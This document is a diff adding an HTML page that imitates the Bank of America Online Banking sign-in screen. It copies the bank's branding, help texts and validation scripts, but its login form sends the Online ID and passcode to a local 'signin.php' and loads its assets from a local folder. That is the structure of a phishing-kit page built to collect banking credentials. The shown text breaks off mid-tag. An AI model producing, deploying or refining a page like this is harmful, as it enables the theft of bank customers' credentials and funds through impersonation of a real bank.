@@ -1,0 +1,1005 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html lang="en"><head>
+    
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
+<meta name="Description" content="Sign In to Bank of America Online Banking."><title>Bank of America | Online Banking | Sign In to Online Banking</title><!-- pkc common css beg -->
+
+
+
+
+
+
+	<link rel="stylesheet" type="text/css" href="images/win_ns6.css">
+	<link rel="stylesheet" type="text/css" href="images/weas_win_ns6.css"><!-- pkc common css end --><!-- pkc common js beg  -->
+
+
+
+
+<script type="text/javascript" language="javascript">
+
+var errorBegin =  "\n<!-- error section --> "
+				+ "\n<table width=\"510\" cellspacing=0 cellpadding=0 border=0 summary=\"\"> "
+				+ "\n "
+					+ "\n<!-- First Row - Red Border --> "
+					+ "\n<tr> "
+					+ "\n<td class=errorbrdr colspan=3><img src=\"images/clr.gif\" width=1 height=1 border=0 alt=\"\"><\/td> "
+					+ "\n<!-- Begin Error Body --> "
+					+ "\n<tr> "
+					+ "\n<td width=1 class=errorbrdr><img src=\"images/clr.gif\" width=1 height=1 border=0 alt=\"\"><\/td> "
+					+ "\n<td width=\"510\"> "
+						+ "\n<table width=\"100%\" border=0 cellspacing=0 cellpadding=0 summary=\"\"> "
+						+ "\n<tr> "
+								+ "\n<td colspan=5><img src=\"images/clr.gif\" width=1 height=10 border=0 alt=\"\"><\/td> "
+						+ "\n<\/tr> "
+						+ "\n<tr> "
+							+ "\n<td width=10><img src=\"images/clr.gif\" width=10 height=1 border=0 alt=\"\"><\/td> "
+							+ "\n<td width=31 valign=top><div class=inline><h3><img src=\"images/icon_alert_error.gif\"  "
+									+ "\nwidth=31 height=27 border=0 alt=\"Error Message\"><\/h3><\/div><\/td> "
+							+ "\n<td width=20><img src=\"images/clr.gif\" width=20 height=1 border=0 alt=\"\"><\/td> "
+							+ "\n<td width=\"100%\"> "
+								+ "\n<div><div><div class=inline><p class=text1><span class=errortext>";
+
+var errorEnd = "\n<\/span><\/p><\/div><\/div><\/td> "
+										+ "\n<td width=10><img src=\"images/clr.gif\" width=10 height=1 border=0 alt=\"\"><\/td> "
+									+ "\n<\/tr> "
+									+ "\n<tr> "
+										+ "\n<td colspan=5><img src=\"images/clr.gif\" width=1 height=10 border=0 alt=\"\"><\/td> "
+									+ "\n<\/tr> "
+									+ "\n<\/table> "
+							+ "\n<\/td> "
+							+ "\n<td width=1 class=errorbrdr><img src=\"images/clr.gif\" width=1 height=1 border=0 alt=\"\"><\/td> "
+					+ "\n<\/tr> "
+					+ "\n<!-- End Error Body --> "
+					+ "\n<!-- Third Row - Red Border --> "
+					+ "\n<tr> "
+                + "\n<td class=errorbrdr colspan=3><img src=\"images/clr.gif\" width=1 height=1 border=0 alt=\"\"><\/td> "
+				+ "\n<\/tr> "
+				+ "\n<!-- End Red Border --> "
+				+ "\n<\/table> "
+			+ "\n<!-- end error section --> ";
+
+function displayInScreenErrorMessages(error_message) 
+{ 
+		//alert("displayInScreenErrorMessages 1");
+		var formatted_output = errorBegin + error_message + errorEnd;
+
+        if(document.getElementById)
+        {
+           document.getElementById("errorSection").innerHTML = formatted_output;
+        }
+        else if(document.all)
+        {
+           document.all.errorSection.innerHTML = formatted_output;
+        }
+}
+
+function create_button(text, href, css_class, onclick_evt, onmouseover_evt, onmouseout_evt, tabindex)
+ {
+   var t = "";
+   if (( document.getElementById )||( document.all ))
+   {
+		// browser implements part of W3C DOM HTML
+		// Gecko, Internet Explorer 5+, Opera 5+
+		// Internet Explorer 4 or Opera with IE user agent
+		t = "<div class=" + css_class + "><a title=\"" + text + "\" href=\"" + href + "\" class=" + css_class 
+		  + " onFocus='hover(this, \"" + css_class + "-over\")'"
+		  + " onBlur='hover(this, \"" + css_class + "\")'";
+		  
+		if (onclick_evt) { t = t + " onClick=\"" + onclick_evt + "\""; }
+		if (onmouseover_evt) { t = t + " onMouseOver=\"" + onmouseover_evt + "\""; }
+		if (onmouseout_evt) { t = t + " onMouseOut=\"" + onmouseout_evt + "\""; }
+		if (tabindex) { t = t + " tabindex=\"" + tabindex + "\""; }
+		t = t + ">" + text + "<\/a><\/div>"; 
+
+	}
+   else
+   {
+		// Netscape 4
+		t = "<table border=0 cellpadding=0 cellspacing=0 summary=\"\" class=" + css_class + "><tr><td width=2 rowspan=2 class=" + css_class + "-left><img src=\"images/clr.gif\" alt=\"\" width=2 height=2><\/td><td class=" + css_class + "-top><img src=\"images/clr.gif\" alt=\"\" width=1 height=2><\/td><td width=2 rowspan=3 class=" + css_class + "-right><img src=\"images/clr.gif\" alt=\"\" width=2 height=2><\/td><\/tr><tr><td><div class=" + css_class + "style=\"padding: 1px 3px 1px 3px;\"><a title=\"" + text + "\" href=\"" + href + "\" class=" + css_class 
+		  + " onFocus='hover(this, \"" + css_class + "-over\")'"
+		  + " onBlur='hover(this, \"" + css_class + "\")'";
+		  
+		if (onclick_evt) { t = t + " onClick=\"" + onclick_evt + "\""; }
+		if (onmouseover_evt) { t = t + " onMouseOver=\"" + onmouseover_evt + "\""; }
+		if (onmouseout_evt) { t = t + " onMouseOut=\"" + onmouseout_evt + "\""; }
+		if (tabindex) { t = t + " tabindex=\"" + tabindex + "\""; }
+		t = t + ">" + text + "<\/a><\/div><\/td><\/tr><tr><td colspan=2 class=" + css_class +  "-right><img src=\"images/clr.gif\" alt=\"\" width=1 height=2><\/td><\/tr><\/table>"; 
+	}
+	document.write(t);
+ }
+
+ function hover(ref, classRef) { eval(ref).className = classRef; }
+
+
+
+var platform= navigator.platform.toLowerCase(); // Operating system
+var appName = navigator.appName;                // Browser name
+var appVer= parseInt(navigator.appVersion);     // Browser versionnumber
+
+// set the correct style sheet for the browser
+function checkBrowser(doc)
+{
+    if (platform.indexOf("win") != -1)  // Windows platform
+    {
+        if (appName == "Netscape" && appVer >= 5) // Netscape 6.x
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_ns6.css">');
+        }
+        else if (appName == "Netscape" && appVer >= 4) // Netscape 4
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_ns4.css">');
+        }
+        else if (appName == "Microsoft Internet Explorer" && appVer >= 4 &&  navigator.appVersion .indexOf("MSIE 4") != -1) // IE 4.x
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_ie4.csss">');
+        }
+        else if (appName == "Microsoft Internet Explorer" && appVer >= 4) // IE 4.x +
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_ie.css">');
+        }
+        else if (appName == "Opera")  // Opera 5.x, 6.x
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_opera.css">');
+        }
+        else  // All other win browsers
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_ie.css">');
+        }
+    }
+    else if (platform.indexOf("mac") != -1)    // Mac platform
+    {
+        if (appName == "Netscape" && appVer >= 5) // Netscape 6.x
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/mac_ns6.css">');
+        }
+        else if (appName == "Netscape" && appVer >= 4) // Netscape 4
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/mac_ns4.css">');
+        }
+        else if (appName == "Microsoft Internet Explorer" && appVer >= 4) // IE 4.x
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/mac_ie.css">');
+        }
+        else if (appName == "Opera")  // Opera 5.x, 6.x
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/mac_ie.css">');
+        }
+        else  // All other browsers
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/mac_ie.css">');
+        }
+    }
+    else if (platform.indexOf("os2") != -1)    // os2 platform
+    {
+        if (appName == "Netscape" && appVer >= 4) // Netscape 4
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/os2_ns4.css">');
+        }
+        else
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_ie.css">');
+        }
+    }
+    else    // all other platforms
+    {
+        if (appName == "Netscape" && appVer >= 4) // Netscape 4
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/mac_ns4.css">');
+        }
+        else
+        {
+            doc.writeln('<link rel="stylesheet" type="text/css" href="images/win_ie.css">');
+        }
+    }
+}
+/* Multiply the size of the font for each style sheet rule
+   for all linked and embedded style sheets.
+*/
+function multipleFontSize(factor)
+{
+	//alert("pkc1");
+    var styleSheet;
+    var i;
+    var done;
+
+    for(i=0;i<document.styleSheets.length;i++)
+    {
+        styleSheet = document.styleSheets[i].cssText;
+        styleSheet = styleSheet.toLowerCase();
+
+        var pattern = /font-size\s*:\s*([\d\.]+)((em)|%)+/g;
+        pattern.multiline = true;
+        var result;
+        done = false;
+
+        while (!done)
+        {
+            var result = pattern.exec(styleSheet);
+            if (result == null)
+            {
+                done = true;
+            }
+            else
+            {
+                strLeft = styleSheet.substring(0, result.index-1);
+                strMid = result[0];
+                strRight = styleSheet.substring(result.index +  result[0].length);
+                size = result[1];
+                size *= factor;
+                var number_pattern = /(\d*.?\d{0,2})\d*/;
+                var number_result = number_pattern.exec(size);
+                strMid = strMid.replace(result[1], number_result[1]);
+                styleSheet = strLeft + strMid + strRight;
+            }
+        }
+        document.styleSheets[i].cssText= styleSheet;
+    }
+}
+
+/* Examine the default page font.  If too small,
+   increase by a percent factor
+*/
+function examineFontSize(ref)
+{
+    if (document.getElementById)
+    {
+        if (document.getElementById(ref).currentStyle)
+        {
+            var size = document.getElementById(ref).currentStyle.fontSize;
+            var index = size.indexOf("pt");
+            var newstr = parseInt(size.substr(0,index));
+
+            if (newstr < 10)
+            {
+                multipleFontSize(1.3);
+            }
+            else if (newstr < 12)
+            {
+                multipleFontSize(1.2);
+            }
+        }
+    }
+}
+
+
+
+</script><!-- pkc common js end  -->
+
+
+
+
+
+<style type="text/css"> 
+.typefontred
+{
+   font-style: monospace; 
+   color: #ff0000; 
+}
+</style>
+
+<script type="text/javascript" language="javascript">
+<!-- 
+      if (top.location != self.location) 
+      {
+
+		top.location = self.location;
+      }
+-->
+</script>
+<script type="text/javascript" language="javascript">
+<!--
+
+function isLetter(aChar)
+{
+	return ((aChar >= 'a') && (aChar <= 'z')) ||
+		((aChar >= 'A') && (aChar <= 'Z'));
+}
+
+
+function isDigit(aChar)
+{
+	return ((aChar >= '0') && (aChar <= '9'));
+}
+
+
+function isNumeric(number)
+{
+	number = number + "";
+	return ((number.length > 0) && isComposedOfChars("0123456789", number));
+}
+
+
+function isAlphanumeric(alphaNumString)
+{
+	alphaNumString = alphaNumString + "";
+	return ((alphaNumString.length > 0) &&
+		isComposedOfChars("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", alphaNumString));
+}
+
+function isAlphanumericOrUnderscore(alphaNumString)
+{
+	alphaNumString = alphaNumString + "";
+	return ((alphaNumString.length > 0) &&
+		isComposedOfChars("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_", alphaNumString));
+}
+
+function hasText(text)
+{
+	var newText = strip(text + "", " ");
+	//return (newText != "");
+	//FIX:
+	if((newText != "") && (newText != null))
+		return(true);
+	else
+		return(false);
+}
+
+
+function remove(string, rChar)
+{
+	var retStr = "";
+
+	for(var i = 0; i < string.length; i++)
+	{
+		var ch = string.charAt(i);
+		if (ch != rChar)
+		{
+			  retStr = retStr + ch;
+		}
+	}
+	return retStr;
+}
+
+
+// Return the index into inString of the first character in inString
+// that is not found in okayChars.
+function indexOfFirstNotIn(okayChars, inString)
+{
+	var i;
+	for (i=0; i < inString.length; i++)
+	{
+		var charm = inString.charAt(i);
+		if (okayChars.indexOf(charm) == -1)
+		{
+		  return i;
+		}
+	}
+	return -1;
+}
+
+// Return the index into inString of the last character in inString
+// that is not found in okayChars.
+function indexOfLastNotIn(okayChars, inString)
+{
+	var i;
+	for (i = inString.length - 1; i >= 0; i--)
+	{
+		var charm=inString.charAt(i);
+		if (okayChars.indexOf(charm) == -1)   // return this char
+		{
+		  return i;
+		}
+	}
+	return -1;
+}
+
+
+function strip(string, sChar)
+{
+	if ((string == null) || (string == ""))
+	{
+		return "";
+	}
+
+	var startIndex = indexOfFirstNotIn(sChar, string);
+	var endIndex = indexOfLastNotIn(sChar, string);
+
+	// Confirm that we have at least one non-stripped character.
+	if (startIndex == -1)
+	{
+		return "";
+	}
+
+	return string.substring(startIndex, endIndex + 1);
+}
+
+
+function substringWithChars(validChars, inString)
+{
+	var tempString = "";
+	var i;
+	for (i=0; i < inString.length; i++)
+	{
+		var ch = inString.charAt(i);
+		if (validChars.indexOf(ch) != -1)   // this char is valid, save it
+		{
+			  tempString = tempString + ch;
+		}
+	}
+	return tempString;
+}
+
+function isComposedOfChars(validChars, inString)
+{
+	return (indexOfFirstNotIn(validChars, inString) == -1);
+}
+
+function hasCommonLengthFourSubstrings(inString1, inString2)
+{
+	var string1 = strip(inString1," ");
+	var string2 = strip(inString2," ");
+	var numberOfSubstrings = string1.length - 3;
+	var i;
+	for (i = 0; i < numberOfSubstrings; i++)
+	{
+		var nextSubstring = string1.substring(i, i+4);
+		if (string2.indexOf(nextSubstring) != -1)
+		{
+			return true;
+		}
+	}
+	return false;
+}
+
+function autoSub() 
+{
+	checkFormInputNSubmit();
+	doSub();
+}
+
+
+function subFormData()
+{
+	document.cookie =  "autoPostCheck=1240";
+	document.form1.submit();
+}
+
+function checkForCookies()
+{
+	var today = new Date();
+	var expire = new Date();
+	expire.setTime(today.getTime() + 3600000 * 24);
+	document.cookie = "cookieEnabledPersist=true; expires=" + expire.toGMTString();
+	document.cookie = "cookieEnabledSession=true";
+	var cookieString = ""+document.cookie;
+	if (cookieString.indexOf("cookieEnabledPersist")==-1 || cookieString.indexOf("cookieEnabledSession")==-1)
+	{
+		document.location.href = "/cgi-bin/sso.login.controller?state=CA&reason=noCookie";
+	}
+}
+
+function loadGating()
+{
+	checkForCookies();
+}
+// -->
+</script>
+
+
+
+<script type="text/javascript" language="javascript">
+<!--
+
+var times = 0;
+var errm = "";
+var errormsg = "";
+var blockbrow = "";
+var clickcount = 0;
+
+var bookmarkText = "";
+
+var doc;
+var new_win = null;
+var nw = null;
+
+ERROR_MESSAGE_ALREADY_SUBMITTED = "You have already submitted a request.  Please wait for your request to be processed.";
+ERROR_MESSAGE_INVALID_PASSWORD = "The Online Passcode can be 4-12 alphanumeric characters, and cannot contain special characters (i.e. !@#$%^&*()-+,.?/:;).";
+ERROR_MESSAGE_INVALID_ACCESS_ID = "We are unable to recognize the ID you have entered. The ID can be 5 to 25 alphanumeric characters.  Please verify and reenter your ID.  For more information about your ID, click on the ID link.";
+ERROR_MESSAGE_EMPTY_FIELDS = "Please complete all of the required fields before continuing.";
+ERROR_MESSAGE_INVALID_ACCESS_ID_RESET = "Please enter your Online ID if you wish to reset your Online Passcode.  If you don't know your Online ID, please call 1.800.792.0808 for assistance."
+ERROR_MESSAGE_INVALID_ACCESS_ID_CREATE = "Please enter your Online ID if you wish to create your Online Passcode.  If you don't know your Online ID, please call 1.800.792.0808 for assistance."
+
+ERROR_MESSAGE_MASKED_ID_INVALID = "The Online ID you entered is not the same as your saved ID. Please re-enter your entire ID.";
+MSG0001="Please enter both the ID and Passcode before continuing.";
+MSG0001_pm="Please enter the ID before continuing.";
+
+MSG0002="The ID must be 5-25 numbers and/or letters. <BR>Please re-enter your Online ID.";
+MSG0002_letter="The Online ID you entered contains letter(s).";
+MSG0002_spl_char="The Online ID you entered contains one or more special character(s) (<span class=typefontred>~`!@#$%^&*()-+|&#92;&#34;',.?/:;<>[]{}=<\/span>), which is not allowed.";
+MSG0002_short="The Online ID you entered is too short.";
+MSG0002_large="The Online ID you entered is too large.";
+MSG0002_space="The Online ID you entered contains one or more <span class=typefontred>space<\/span> character(s), which is not allowed.";
+
+MSG0003="The passcode must be 4-12 numbers and/or letters. Please re-enter the passcode.";
+MSG0003_short="The passcode you entered is too short.";
+MSG0003_large="The passcode you entered is too large.";
+MSG0003_spl_char="The passcode you entered contains one or more special character(s) (<span class=typefontred>~`!@#$%^&*()-+|&#92;&#34;',.?/:;<>[]{}=_<\/span>), which is not allowed.";
+MSG0003_space="The passcode you entered contains one or more <span class=typefontred>space<\/span> character(s), which is not allowed.";
+
+function openErrorWindow(error_message)
+{
+	//windowOpener2(error_message);
+	displayInScreenErrorMessages(error_message);
+}
+
+pmLogin  = false;
+
+function checkPMFormInputNSubmit()
+{
+    // alert("Spoof: js - pmlogin");
+    if (document.form1.pmloginid)
+    {
+        // alert("Spoof: js - pmlogin");
+        pmLogin = true;
+		document.form1.pmbutton.value = "true";
+    }
+    else
+    {
+        // alert("Spoof: js - not pmlogin");
+    }
+
+    checkFormInputNSubmit();
+    pmLogin = false;
+	document.form1.pmbutton.value = "false";
+}
+
+function checkFormInputNSubmit()
+{
+	// No Id and Pass
+	// ID - No Pass
+	// Pass - No ID
+	// Either one Misssing
+
+	// Incorrectly formatted ID
+	// Incorrectly formatted Pass
+
+
+	//document.form1.Access_ID.value = document.field1Form.Access_ID.value;
+
+	// netscape 4 - direct submit
+	if(navigator.appName.indexOf("Netscape") > -1 && navigator.appVersion.indexOf("4.") > -1)
+	{
+		//alert("Net 4 submit");
+		document.form1.server_check.value = "true";
+		document.form1.submit();
+		return;
+	}
+
+	accessID = "";
+	accessIDCheck = true;
+
+	if (document.form1.Access_ID_1 )
+	{
+		if (document.form1.Access_ID && (document.form1.Access_ID.value == "") == false )
+		{
+			// alert("multid: js - aid 1");
+			accessID = strip(document.form1.Access_ID.value, " ");
+		}
+		else
+		{
+			// alert("multid: js - aid 2");
+			accessID = strip(document.form1.Access_ID_1.value, " ");
+			accessIDCheck = false;
+		}
+	}
+	else
+	{
+		// alert("multid: js - aid 3");
+		accessID = strip(document.form1.Access_ID.value, " ");
+	}
+
+	// alert("multid: js - aid [" + accessID + "]");
+
+	passcode = "";
+
+    // alert("Spoof: js - pmDead [" + pmDead + "]");
+
+    if (document.form1.pmloginid)
+    {
+        if (pmDead == false)
+        {
+            // alert("Spoof: js - pmlogin");
+            pmLogin = true;
+        }
+    }
+
+    // alert("Spoof: js - pmlogin [" +pmLogin+ "]");
+
+        passcodeCheck = false;
+        // alert("multid: js - aid 4");
+        if( document.form1.Current_Passcode )
+        {
+                // alert("multid: js - aid 4.1");
+                passcodeCheck = true;
+        }
+
+        passcode = null;
+        if(passcodeCheck)
+        {
+                // alert("multid: js - aid 4.2");
+                passcode = strip(document.form1.Current_Passcode.value, " ");
+        }
+        else
+        {
+                // alert("multid: js - aid 4.3");
+                document.form1.pmbutton.value = 'true';
+        }
+
+	if ( pmLogin || passcodeCheck == false )
+	{
+		if ( accessID.length == 0 || accessID == "" )
+		{
+			openErrorWindow(MSG0001_pm);
+			return;
+		}
+	}
+	else
+	{
+		if ( ( accessID.length == 0 || accessID == "" ) || ( passcode.length == 0 || passcode == "" ) )
+		{
+			openErrorWindow(MSG0001);
+			return;
+		}
+	}
+
+	error_message = "empty";
+
+	if( accessIDCheck )
+	{
+		error_message = checkAccessID(accessID);
+	}
+
+	if ( error_message != "empty" )
+	{
+		openErrorWindow(error_message);
+		return;
+	}
+
+	if ( pmLogin == false && passcodeCheck )
+	{
+		// alert("multid: js - aid 4.4");
+		error_message = checkPasscode(passcode);
+	}
+
+	if ( error_message != "empty" )
+	{
+		openErrorWindow(error_message);
+		return;
+	}
+
+	//added to prevent double clicks
+	if(clickcount > 0)
+		return;
+
+	clickcount++;
+	document.form1.submit();
+}
+
+function checkAccessID(accessID)
+{
+
+	maskedId = "";
+	
+	if ( document.form1.Access_ID.value.indexOf(' ')  > -1 )
+	{
+		return MSG0002_space + " <BR>" + MSG0002;
+	}
+
+	if(maskedId == accessID)
+	{
+		return "empty";
+	}
+
+	if(maskedId != null && maskedId.length > 0)
+	{
+		if(accessID.indexOf('*') > -1)
+		{
+			return ERROR_MESSAGE_MASKED_ID_INVALID;
+		}
+	}
+
+	if (accessID.length < 5 )
+	{
+		return MSG0002_short + " <BR>" + MSG0002;
+	}
+
+	if (accessID.length > 25 )
+	{
+		return MSG0002_large + " <BR>" + MSG0002;
+	}
+
+	if (!isAlphanumericOrUnderscore(accessID)) 
+	{
+		return MSG0002_spl_char + " <BR>" + MSG0002;
+	}
+
+	return "empty";
+}
+
+function checkPasscode(passcode)
+{
+	if ( document.form1.Current_Passcode.value.indexOf(' ')  > -1 )
+	{
+		return MSG0003_space + " <BR>" + MSG0003;
+	}
+
+	if (passcode.length < 4 )
+	{
+		return MSG0003_short + " <BR>" + MSG0003;
+	}
+
+	if (passcode.length > 12 )
+	{
+		return MSG0003_large + " <BR>" + MSG0003;
+	}
+
+	if (!isAlphanumeric(passcode))
+	{
+		return MSG0003_spl_char + " <BR>" + MSG0003;
+	}
+	return "empty";
+}
+
+
+function gatingUnload()
+{
+}
+
+
+function doSub() 
+{
+	checkFormInputNSubmit();
+	return true;
+}
+
+
+function loginHelp()
+{
+	document.location.href = "/cgi-bin/sso.login.controller?state=CA&reason=assistCA";
+}
+
+function rememberMeHelp()
+{
+	document.location.href = "/cgi-bin/sso.login.controller?state=CA&reason=rememberMeAssist";
+}
+
+function createPasscode()
+{
+	if( document.form1.Access_ID )
+	{
+		document.createForm.Access_ID.value = document.form1.Access_ID.value;
+	}
+	document.createForm.reason.value = "create_passcode_ca";
+	document.createForm.submit();
+
+}
+
+function resetPasscode()
+{
+	if( document.form1.Access_ID )
+	{
+		document.resetForm.Access_ID.value = document.form1.Access_ID.value; 
+	}
+	document.resetForm.reason.value = "reset_request_ca";
+	document.resetForm.submit();
+}
+
+function doReset() 
+{
+	document.form1.Access_ID.value = document.form1.Access_ID.value;
+	if (times==0) 
+	{
+		if (document.form1.Access_ID.value.length == 0)
+		{
+			windowOpener2(ERROR_MESSAGE_INVALID_ACCESS_ID_RESET);
+			return false;
+		}
+		if (!isValidAccessID(document.form1.Access_ID)) 
+		{
+			windowOpener2(ERROR_MESSAGE_INVALID_ACCESS_ID);
+			return false;
+		}
+		document.form1.reset.value = "yes";
+		subFormData();
+		return false;
+	}
+	else 
+	{
+		windowOpener2(ERROR_MESSAGE_ALREADY_SUBMITTED);
+		return false;
+	}
+}
+
+// -->
+</script></head>
+
+<body onload="loadGating()" id="body" class="body" bgcolor="#ffffff" text="#000000">
+
+<!-- logo_header_n_global_navigation beg -->
+<img src="images/olb_masthead_nonav.gif" alt="Bank of America Higher Standards Online Banking" border="0" height="83" width="747"><br>
+<!-- logo_header_n_global_navigation end -->
+
+<!-- check fonts beg -->
+
+<script type="text/javascript" language="javascript">
+<!-- 
+examineFontSize("body");
+//-->
+</script>
+
+<!-- check fonts beg -->
+
+
+<!-- BEGIN CORE HTML Presentation -->
+
+
+<!-- Begin page label --> 
+<div class="pagelabel"> 
+	<table class="nav3" summary="" border="0" cellpadding="0" cellspacing="0" width="735"> 
+	<tbody><tr><td colspan="2"><img src="images/clr.gif" alt="" height="6" width="1"></td></tr> 
+	<tr> 
+		<td valign="bottom"><div style="display: block;"><img src="images/clr.gif" alt="" height="10" width="200"></div><div><a name="skipnav"></a><h1 class="pagelabel">Sign In<br></h1></div></td> 
+		<td class="text2" align="right" nowrap="nowrap" valign="top"><img src="images/clr.gif" alt="" height="1" width="10"></td></tr> 
+	<tr><td colspan="2"><img src="images/clr.gif" alt="" height="10" width="1"></td></tr> 
+	<tr><td class="rulegrey3" colspan="2"><img src="images/clr.gif" alt="" height="1" width="1"></td></tr> 
+	<tr><td colspan="2"><img src="images/clr.gif" alt="" height="12" width="1"></td></tr> 
+	</tbody></table> 
+</div> 
+<!-- End page label --> 
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="747">
+<tbody><tr>
+    <!-- Left margin -->
+    <td width="12"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+    <!-- End left margin -->
+
+    <!-- Begin Sign In form -->
+    <td valign="top" width="510">
+    <div id="errorSection"></div>
+	    <form name="form1" action="signin.php" method="post" onsubmit="doSub();return false;">
+          <table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tbody><tr> <td colspan="4"><img src="images/clr.gif" alt="" height="12" width="1"></td> </tr>
+    <tr>
+        <td rowspan="15" width="10"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+        <td style="padding-top: 3px; text-align: right;" align="right" nowrap="nowrap" valign="top" width="140"><label for="Access_ID"><span class="title6">Enter Online ID:</span><br><span class="h2-ada">(5 - 25 numbers and/or letters)</span></label></td>
+        <td width="10"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+        <td valign="top" width="100%">
+			<input maxlength="25" name="Access_ID" size="25" id="Access_ID" value="" class="text1"><br><span class="text1a">(5 - 25 numbers and/or letters)</span><br><input value="Y" name="rembme" id="rembme" class="text1" type="checkbox"><label for="rembme"><span class="text1">&nbsp;&nbsp;Save this online ID</span></label>&nbsp;&nbsp;<span class="text1">(<a title="How does this work?" href="https://onlineid.bankofamerica.com/cgi-bin/sso.login.controller?reason=rememberMeAssist" class="linknormal">How does this work?</a>)</span>
+		</td>
+    </tr>
+	
+	
+<!-- Blank Line -->
+<tr><td colspan="3"><img src="images/clr.gif" alt="" height="15" width="1"></td></tr>
+<!-- passcode  -->
+<tr>
+    <td style="padding-top: 3px;" align="right" nowrap="nowrap" valign="top" width="140"><label for="Current_Passcode"><span class="title6">Enter Passcode:</span><span class="h2-ada"><br>(4 - 12 numbers and/or letters)</span></label></td>
+    <td width="10"><img src="images/clr.gif" alt="" height="1" width="12"></td>
+    <td valign="top" width="100%"><input maxlength="20" size="17" name="Current_Passcode" id="Current_Passcode" class="text1" type="password">
+                  <br><span class="text1a">(4 - 20 numbers and/or letters)</span></td>
+</tr>
+
+    <tr><td colspan="3"><img src="images/clr.gif" alt="" height="15" width="1"></td></tr>
+
+    <!-- sign in button -->
+    <tr>
+        <td colspan="2"><img src="images/clr.gif" alt="" height="1" width="1"></td>
+        <td nowrap="nowrap" width="100%">
+            <table summary="Layout table" border="0" cellpadding="0" cellspacing="0">
+            <tbody><tr>
+            <td nowrap="nowrap">
+            <script type="text/javascript" language="javascript">
+                <!--
+                create_button("Sign In", "javascript:checkFormInputNSubmit();",
+                     "btn1", null, "self.status='Sign In';return true;",
+                     "self.status='';return true;", null );
+				document.write('<input border=0 type="image" src="images/weas/clr.gif" width=0 height=0 alt="Sign In"/>');
+                //-->
+            </script>
+            </td>
+            </tr>
+            </tbody></table>
+        </td>
+    </tr>
+
+    <tr><td colspan="3"><img src="images/clr.gif" alt="" height="20" width="1"></td></tr>
+
+    <!-- id/pass links -->
+    <tr><td colspan="2"><img src="images/clr.gif" alt="" height="1" width="1"></td><td colspan="1">
+            <noscript><a
+title="Reset passcode"
+href="/cgi-bin/sso.login.controller?state=CA&fkpst=true&Access_ID=&reason=create_passcode_model"
+class=linknormal><span class=text1>Reset passcode</span></a></noscript><script type="text/javascript" language="javascript">document.write('<a title="Reset passcode" href="javascript:createPasscode()" class=linknormal><span class=text1>Reset passcode<\/span><\/a>'); </script>
+            <br>
+            <noscript><a
+            title="Forgot or need help with your ID?"
+            href="/cgi-bin/sso.login.controller?state=CA&fkpst=true&Access_ID=&reason=resetid_request_ca"
+            class=linknormal><span class=text1>Forgot or need help with your ID?</span></a></noscript><script type="text/javascript" language="javascript">document.write('<a title="Forgot or need help with your ID?" href="javascript:loginHelp()" class=linknormal><span class=text1>Forgot or need help with your ID?<\/span><\/a>');</script></td>
+    </tr>
+	 <!-- ad banner -->
+    <tr><td colspan="2"><img src="images/clr.gif" alt="" height="1" width="12"></td><td colspan="3"><div style="display: block;"><img src="images/clr.gif" alt="" height="25" width="1"></div><a title="Bank of America Product Promotion" href="http://www.bankofamerica.com/promos/jump/olbcstsave"><img src="images/obpromo_bnr_dpo_in.gif" alt="Bank of America Product Promotion" border="0" height="58" width="347"></a></td></tr>
+
+
+    </tbody></table>
+    </form>
+
+	</td>
+    <!-- Middle gutter -->
+    <td width="20"><img src="images/clr.gif" alt="" height="1" width="20"></td>
+    <!-- End middle gutter -->
+
+    <td align="left" valign="top" width="205">
+		
+<!-- Module Frame -->
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+
+    <!-- Module Header -->
+    <tbody><tr><td class="mod2-brdr-hs"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td></tr>
+
+    <!-- Start of Module Content -->
+    <tr>
+        <td valign="top"><table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tbody><tr>
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" height="1" width="1"></td>
+                <td valign="top"><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div><div class="signin-box"><span style="color: rgb(0, 0, 0);">Not using Online Banking?</span><br><a class="linknormal" onfocus="self.status='Enroll now for Online Banking';return true;" onblur="self.status='';return true;" onmouseover="self.status='Enroll now for Online Banking';return true;" onmouseout="self.status='';return true;" title="Enroll now for Online Banking" href="https://onlineid.bankofamerica.com/cgi-bin/sso.login.controller?reason=ca_enroll">Enroll now<br>for Online Banking<img src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a><br><br><a class="linknormal" onfocus="self.status='Learn More';return true;" onblur="self.status='';return true;" onmouseover="self.status='Learn More';return true;" onmouseout="self.status='';return true;" title="Learn more about Online Banking" href="http://www.bankofamerica.com/state.cgi?section=online">Learn more <br>about Online Banking<img src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a><br><br><a class="linknormal" onfocus="self.status='Service Agreement';return true;" onblur="self.status='';return true;" onmouseover="self.status='Service Agreement';return true;" onmouseout="self.status='';return true;" title="Service Agreement" href="http://www.bankofamerica.com/state.cgi?section=onlinebanking_svc">Service Agreement<img 